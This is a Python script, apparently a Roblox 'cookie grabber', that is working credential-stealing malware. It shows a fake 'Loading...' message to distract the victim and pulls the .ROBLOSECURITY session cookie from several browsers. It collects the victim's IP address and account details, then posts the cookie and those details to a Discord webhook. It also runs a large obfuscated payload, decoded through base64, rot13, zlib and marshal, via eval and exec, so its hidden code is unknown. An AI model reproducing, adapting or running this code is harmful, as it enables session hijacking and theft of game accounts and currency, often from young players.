import os
import base64, codecs
import json

webhookk = "heh"

def command(c):
    os.system(c)
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests,re
    from discordwebhook import *
    import browser_cookie3
except:
    command("py -m pip install discordwebhook")
    cls()
    command("py -m pip install robloxpy")
    cls()
    command("py -m pip install requests")
    cls()
    command("pip install discordwebhook")
    cls()
    command("pip install robloxpy")
    cls()
    command("pip install requests")
    cls()
    print("Run the app again.")
    exit()




dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def cookieLogger():

    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass


cookies = cookieLogger()


#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = cookies[1]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
dnso = None
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### SENDING TO WEBHOOK #################
magic = 'aW1wb3J0IG1hcnNoYWwsIHpsaWIsIGJhc2U2NCwgbHptYQ0KSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJPSdJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUknDQpJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUk9J0lJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSScNCmV4ZWMobWFyc2hhbC5sb2Fkcyh6bGliLmRlY29tcHJlc3MobHptYS5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoYmFzZTY0LmI4NWRlY29kZShiJ0ZIfmVVUzRNOV5LfHhlKUY+K0V6TDEjZnxLfmg7a0t8dys9T2U8R3ZLfmhPOFdsRE48UzlFbEZHQnt7NVkqJUFBVDZzNWFOPUlhUWM2bnEtWWhoTWRSZDcqM05rZVQrTj4rN09RJkNCMFFBPGluWEYqYXlHKHw7dUt+X09VTHM+Jj5Xa1h7KlpnNkhlUThoR2ZSIzxMSVN9UmRBRkdfSzRjMjd9YWI4Y2lhUSFpUiRSYz1tZ2N4aCE7USpiZU9jVHFFR0ZtZj9CSCkyPjxHajJwcVctRTkmRyZlNiRHLTdFKlN1Ykt4TkdwMUNRYmN4QVhFUmh0U31SUk5GTHk7YFAlbDkqWiU8RTFGSz1kMkxON04mR2ptWEhjWD93c2J+JDErWWVfZ31XQDlmak8/b3ZlRkdNcUhOOzcmbUlZQFIjZE18MTtWfHE2JFhLeVBuY1F8SGRIRHloOURgc2FrTkhaJT9ZQncpWGN6UTJxRzxZdjdaRlAxbE1OJSY+REBiLW5QJUI3a1paQXhEZE18MTtIOFhsUkx3WXdXTj5WUWBYPlUwJWRTaGlURy1YZUFEQDx4a2NzRE8+RzxZOy1OSDBjc1padFNaVz45eEdQLS1gQUc8aWo0WUE8THNGR0BGaElBJnhwRkgzMU5JNX04UVdvSWlaRHteV3hObTYlYVc+OGcxTko9azVJOHRrNFAmN0dERkxoVyNidSV3M0hlKkxiWmU/ZD9GRyolblhFfGF8RyptQXVOX3RDSGMxfmAxWiF8U29OPUd0aVJaTH1MSVpJa31NdEV+e2NWPFh0SWVKd3VWUkIoPFo4Uzd6UElQdWtTViVgP2JUQko4ZE5Pbj9JWlFRZkZHQExBUSZuUFlPaUQ2SFZReGlLWSpsa2FheGhMKU89P25aWkUxMnhHK0FqKVAqYEl6Rmc5XmlTN2NeWkcpezZoUERuJi1HR3txUFlBWjhyUEJtOWhaWn4yfUxedntSTkd+dkxJND8kMlJ5ME9xSWNhMllSNU1wY2JZZjtUUzllbHpPPWUrb2N5ZWkyYSNMbnlaJVJab09sKWdNWmUmYkhZQTwoQkdHdG09UiVsfUBjMHlLM0ctK344WmJ2ZFNYPU4pfWI1S0peWmdXSStTNjZJS0Y7IVlJRmphNiNNeyNYSlolUl40Y3J8WmdOTWJRO0x0fUREV0tVMDFaZWR3JEZmbjNGWG1XWEJQanBMYlQyNkklTGAheUFZZDNqelBmYnM2T0ttdCFTNkR9QlBETTBCV2pSU25IJW0lJEx2bEEoYmFpODdOb2pJYVImczd7UzMpcDNWTnJIXmEjSngpWWpITW9SNTVpakdjI0lqU3lmSkpXLUNgVlZQdFQ2T2lMP2RNb25RZFFGbk1SWkFtc3RZKUAyaWJ5Ny1lR2NhbXVkUHFuKVEqPX5VTHZja2dNa187YlFmVnRuUjhAME1OQFBrO0xvWU9VVnMyVlVZZDNGdFdLVmNPTTBRWEBZOzxUeFFmNVZUWkRWSjJHRzw5YlFaWn50T0spc01XTVZXKlJXfnpKYlpifDdGPVIrO1dOTEl9WWoxSUJjVF9ZdlAlPnxDYTgrK05iMSsmbFFDNE1TUEUwcDNIQ2FobFg9Ty1MTVFNNmlZLXhFblM5d0tyUVpaKkBMe3dLVklkRkdMRy1eZGZOaX1WQk5Kd2pDYnVtPnBGKX1xYlBnWU5QWG13I3tIYlFmMU9EfGVTYmFZY09SeWNLYVJaZUZ4WmJAIXRiOVFxXlA8bCM2USNWIylHO2RRJlliIVcjVDAlMmdRKkNpaVc8K2RwZFEmbFdIQTYyJFJCMX54YlRuPk5IZig1UlBCQkdJYShZbG9HQjduJk8re3VoYWNNUDFWT25RWEdDNktHV01mV05SeioqRGF6YH50UzUkQ0hGaiFTYmN3dVdmWkFXQk1NUjA1QFFjRkBiUC1TcE1OPm9yKkk1e3dMYWM1Jm5ZaHpEemM1Z0Z0YiFCZnVRI01SX0dmLTE5ZDFgbnRaKjRZamEmMCtJV08tc1RPTGorZEhhSnNhUiZqUCZWb0dMaVdLfmFOWmN1Vm9GTEZ5fFg/SlR7SWRmUF5OP35MfFBjaysjRmc5cHFjYHNMM1llK0leYnhDK2RhNS05ZUZHbl82SUMqc3xIQjM9K2E0fU1KTHNlQGxhejx9LU8qRDM0UWZoTiRjUSRaR09qbCE0YTRTbDdQKTl7PFBodkBQYlp0Xj5NUGhBTkgpM141R2d3ZUpYalZnSWFXcFk7WmJWSHNOP3whQFgqTng3USNuXjxiITt+QFJh'
love = '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'
god = 'QVJtWmNKcm1aYz1HallqQU9MUkM7NylYaVp7UGEmY0hoUEZQSnhGKXZlTFFEdH48WGlZME1OPHVKV09qJnRNSGckRFdEe2ZJWUdmaGN6RkskT19PS141S1FiI3k1STReaSlid3klUkctUGc5V2tmYkJNb0ReMVgqUDNOSEY4ZmtZRkpKPWI0aGVeSGMmJSNGaG87ek9FKm5OUWdUNlVjfmVQdWRRZFpKRD8oSyhSeCklfGQxWG04YSFPaXlWUWVkOVA8M3h3WSZiYmdTdjUqZU9uNiF9YmF5b35HZ3ZjZlpGRXZMRF43Uytid2hKNlhsIW1yY3JRWG5NT1NpZkZobnBqT2xua2taY1EoNE9uT2kmTktibDFPaU9Nfk9FWU8kR2ZHNC1GPVRDMWEmQlFTU2E+Z0xHQlJVJE1LTj1GTm4kcl9ZRT8mOWF4Kz49RHtXRzhQSGlod2NVbnFtWGpwYilYRSQ/SEwyTzEmY3lCflVZPE5zX0lCaVElZFQmWDFXSGQ1emM0ayQyUzN5bF9XPl9fSGRRKFIkWExCenpIRkl4clpBVUxMY1hEYnRiNylSI2RQWT89V2o5cjlkMWdzKE87dV8rRjtxckhTVTZ7NUhCM2VAUUE5Pj5aYlclZFIhVk8oWWlMKyZTWT1MT01QVjteR2dDKShiNjBVPU5JXjdEUSYzX3dHZT1aNmJ3Z3JOTjt4IVpiWEltclFae3VARyg+bEtPbTAoZFEoe2F3TFJEZm1EYDxDOFBqTzZIY1FibHVNUHFKZlhMeFhVV21RLStLfiFzSUghRHFiUUM0JCRXbj9RZlc+OF5vWGlqJURjeT88YFpBJm1sRyZ3XnhIY3ZIRUxgaXBZWiYrZU9XbVE7WFAqUVBCUzV7MHpTMlo8eUk5R1F8YjkjNG1LYD9lPE9KczltUWI8KXpIWm9hOVApdWJ2USFoPyhTVn1XPUdnQ31ZT25POUFWPUdXWU17UlIhR2dkTkJYOyhGTlBIbEgpUnhAPXNWTDU3SUcqb1ZESGNNQVFEX0tIdkZLeytVUzVHcmlXT3pqe1gtK21+YThoYkhOakVmZ1hIalF3Y3M2dXVWPXlweWN2TXZ+SThKJE9GZ0pLTGIjYEAwVDQhMnJXQH5YO1lHIVVeWWZwR2RXX01VYE5OUDIxTGA2PEhObGojT2J4dGAlZDIoMjdSOGN9c05vR2spUyRifH5jMVNyZmJhT15BUzFWI0dGanFgWlZgbnY0YSM/SUxOPk9vMUZJUH1TYzVgR2ZXSX1GN1N+WTJPTz1FTFhTVzB3S1c+aXZrRmxsMzBNbm8lUFZsWGw+VDRnbk1YRWtNNk0wYSNGV29+TGtOaXtLTGRRVT1SYXlUekFRZyUmM1ZuJVhPVkstYEtPayolR0c7Vmk2R0RVTVdkUUQ/PUhCVmA4WDxCYkpieWpta01AZEYqTUBAQkFkVXxENExebyt8YlQzdFNjdXtkUmJ2OU4+Y1d6SD5WS0k3NGF5Qj93V0hMbzdZY0VBd2EoNntfYnU/dmZjVlQ1YForYkZlYzBxMXlNUjdfKVNXaVBXSEJvNEtXbSFseFooPj9rYjVLck5Xa3EpfUwzdyNuS30mWFdIKWwkMkdqdjM2STlWYFNJQ1ZIeFMjQzhsUkF4di1IYkZSV017akNPTWwoVihHZXUhXkgqWkgrV2tePElXSDIqVVgrJXdDRypXT3pHRFR4RFolQkQ8UGgoMHJYLSNRUE9reT0rWiglaDxQRllURlFaYVctRHxKQ3FRJnU9S1BEcEFxSGJPPjVOSzk9cU4+XkBwVm9FUClMMmhqflZQck4lRztVQzljNEpzTUt+OHh7RGAtfTZXcDh5alBqT1JtY3hITktHaj5LV1Y9enk0Tm9GYEBaIWFya1pFO21ARGB7QUlSWEleJlQ2MEtnRkZ7YU1PRyMjTGRQLUFJRiteb2lXS3UqLWN7NldUUGdyYkViV3ViIVlHV15VUlpuJj5jVHA+R1Y9eipBWUJPKGhQail6VEdnQmB8Tz50T2RYaGNQQldKRVBaSVckWGpMVVRCNVBEZHxRYXkzSSNQR2VNT1llWD92V0slVXFiVlcmTGEoNlV2UEFeMWdROHNVTVlFTV41V3FDPD1YTFU0S2JXQjRsRy03dlZiISZKP1lmTk5PUUJOPnRObEgwVE9HMHI7SGQlTGhZZ0JKekY7aFl8ZDBKRilLYH5aJWN+bW9hUmNMVGpHY1pEOUljak40YTVZVjZQal5tY1BqXkNlSWEpVldhNXJRKFdxTjlRTk5HWV5RNz5qc09IcF8/YWMzKVdaK2RldFI4flBiTU4+PkdMe01kN2J+WlVmTHZDX3VOT297Klg7NE9ORi1LMlFRRihTcFlqOTlaSGQ4WmROPVFPOFEmPigpUzVhbktkMV4wNFMzeHYqWS0mKFZkUDdEelhFIW9UYlcmUFVXakp6akhmZU5XWiNodm9UNkp8bmMyI3koTHt4NVpaKCVFQlN3dH4kUmNTSWZHPGgjY0xycj5PTXJLdGBhWSQ9S1hJTmBESEFyU2tJWW5BP04/fSR2Y1gpNGlRQ2NATE1QcUFyTUx8emdPSyZmM0clO3V8WD85cHNUM1Q7TVlIdjdCRzszLXxkUEg8XlpkRkVmRyptV2FiMSFnNUhaKXsxWSs3WV5QJmpFPlA7KjJgSEYkU1VHJnkpfEdpUGlgUDsqWE5QakcyYUx9NTglYXp7Jk1iI1pBPk1LTHVtUzFWYWRXTU9QK2RUZWMyY1VWKFRGaygoKVoqNDFRU1VFOz1MfVBrYVBnKmNXWiE+VTlQZyFlOFI5OV91Y1Q2JjVSWSkqcllqamRNZDJlX3hNP19DQFkmZHZFTU5AVGNWcitEQk5w'
destiny = 'GUq4EQ93p3yToTkjIzS4pH1SHRy6F1EvIlMXI1qsZxN2Gy9vD2qEMaOZp0k2DKIGJPfbF0cuWwVcoSWKDTZ9JJH4MQOGWSc+H1OcCHVwMSSRsQuvIRkTr0qaMvAsGmg0nKWGIzkNWIufpyZ1GUH2FSOuV2kkVIN8ZagTLFSMZHuVBPt/Z1SOZz9UGQSmB0yTXlb9LRk9pSR5HGyrHU1ACKqcH1ZwGUABGx1GL01KKacMGH5dJKfgEz0gGz5CFaVmB0E8DG5zJzEMZKIZsa4/n1qVo001EUghsPynXFALJySwpQuzEUg4rlgTFmkZq1beGSOlHTpeMKgEL2NdsyOPF3R1JTt+FGAuJvgJKx17nPyIJRcHMJEwsUkfrxuuF0f9JFINWSMwAxg5rxErEGMWFIqHBQ5KoFRmF1cTG3x5FPMFGHSCXHqZozV0rSbuE2LuqTkKn0IOFTDjFax+MSH5o0cDEKArK1NgH0t/GINeAmOUFHkYMySQGKjmExcJqUIKnwR8ERkFFm9FIyObXz5JqRyCH1p9GHW0I2cOq1EVDzL0Z1AKV3SOHmV7oUkZGwyvq2ALoJkuJzZlFz9BGK09BSL9V0A6JQgSpaSCCwkaISt8BHHeE0tdKzEUDK1tASSOoR0cIm5uHUgDE01CCHLeo2SXGSA8GyywqRkJEJA0n1cbGU4lovyVM2S4EyWOM0MBL3gJpGuTEakcGxk2C0AWJxR+K0gCMab5B1uyWv0gG2yTAS5vrIxyn0kjATkQH1H3ZJgLoJD/D0jlJKELGaSHHFyJsQudJJZ2F1uvJvydG0yHAHE9BJSnJQRwGzk7qxcJoGIbJIAHLyEjGSIRD1yFJyEzsSWnGTVxLmS+sQkGLwShE0pdZy40Gzy0sTOGV25iHyqgBGufHFS6E0MGrJ5DK1VxX05RLyMLI0uurzcVMIOWDUqBH1ITIGWZqGMUnxuSWH85JJArK0EJCatkH1WvMHN1ExtyDTkFV3V3nJSMJw80LFt4ZyWEAmkiHTZ1YFg7GSVmGmyJLQD4nHksp3WgJvMlZR9ZIKpjASqiqxAYJQ0eqlgMDy5FWJECsabxF3gUsKuFDJHxn0ywnzVdLmEGoHyuWakIESVzpKHuL1E6DKOVEzy9K1qVMxEzJvE+MR1KoTIwA1ugC0ksE2yUD1IVLv1sXIMBEvEuF3gWDwOTMyMgq1A6ZzSGGzyGAUAZZJxzC2V1WvDyLmIcMxyUEU5YA2V1CmOfGxN3DQuuXRu0rIqVoGuMGUfcGKyEDFESoH5CXyVlFPyYFJ5Jr216Hx9zI313HGt5IlynDJ15WxuTn01VIyW1EakLnTVxnzEIVHf7HRL2rQkUEPM1AxyLG21bFTL/pxIVWJ50rR1fJQO6FTIrM1ELoTxeEJZlLSyEEmk0HUIGAQ5OGHk+IwOaI0OGWKuGLHO9ZxMzWKRzHvAFLwSDYJSkZx0+WJgALwIxsTywZybmC2RwDzO6FTZcGQ9wZUcUERtznm4zJvMkn25uD2kYryySIFEWFIb8MQ1CEIyCn1OUIvukHRyssIAFA0qGoxqeBHNwGRNwXSIGVGMbD08gXauGG0IsrFIVBGS5H1cyoIZuGUWbIHyVDzMvESqYoQghJPcLFJ1EWzEEZxqxEIb/LFZmK1WwAKx7q2EEZmRyERN5sxIYr0q7F1bcBmgLIQMGK2kKo3EOVIuZIKpkFQuSpTywqGqNqyMkLRO0GQWtGTyKolLjL2WKWxEDI05eLTcwpaEUsRuTJatbFIpxrKMDE2IyMH9VEIqlLa5nD3MDFFcao08dIJ12Gz9uZ09RCwqeMHuaLPcOEvb5IIMEBS9bBRtcZ1t1I09sK2qApmq0CH1tMQkJGxkCqGqAKwOjF05CrRyxHmyQI3SVWaHlpyMkYIuFGm1xJwIUMStyG2DloGIwE2cHAx1vH3OUDxMZKzEKI0O+IJAZsQyYp0L/MSt2HIcbqQWYsROhEyyzGx0gIm45ZxgZZ0gPFxtdWQA9L3y1pzOZsyEHA0twLwMxHJAanJkKDPMyFycaAHA3JJpjEIuRCxMUL2V0XyEjIm4eqyIEWQgzsHtdLHIEExklqFAxGI8bASN8Fy5gFHS2oHkuraH0rTA3r3NxMSAarG5DnHcuoxMUEmH3MSE3VIIRKabkpRMhF2DxEROuZTSGsIAVq2AFAT1HGJ1WGFACEa1IYIbwnKMnMR54JRWDMzS2VHMaJwSWFJE4XHqUXQ1BH1NzHGA2JzWNYFMWI31KBRuzDG80LFSiCKgTEIEBZHE7Ex9UJPycJwSVEJ1PL2V4qG1cLHWJoFIKoGkOIyZ3MSSTI2gjZSIZIwxdFHunMaxlGGObrzgWDaSLYIyWnaAzI19AZ21MMJqsK0g8qm1FJxZ1pvIFMPSzH0McsHV1Ew9grTcBCTjxEIqrX2VkJRjmn0yGsFEtWRg8qlx1F3k4JJkGAlE2qvpcXFxcXFxAPxyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFG0aFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWWj0XFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWCFqWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHyWFHxa'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))

discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name": "Creation Date", "value": crdate, "inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},


        }
    ],
)
